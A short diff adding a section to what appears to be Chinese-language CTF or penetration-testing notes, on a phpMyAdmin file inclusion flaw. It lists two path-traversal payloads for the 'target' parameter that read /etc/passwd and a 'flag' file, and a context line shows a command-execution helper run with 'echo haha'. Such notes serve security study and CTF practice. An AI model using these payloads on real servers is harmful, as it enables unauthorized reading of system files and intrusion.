@@ -165,5 +165,18 @@ for i in range(0, len(list)):
     url_explosion(url,path,"echo haha")
 ```
 
+* #### phpMyAdmin数据库
+
+后缀加/phpmyadmin进入数据库
+
+文件包含漏洞
+
+payload：
+
+```
+?target=db_sql.php%253f/../../../../../../../../etc/passwd
+?target=db_sql.php%253f/../../../../../../../../flag
+```
+
 
 
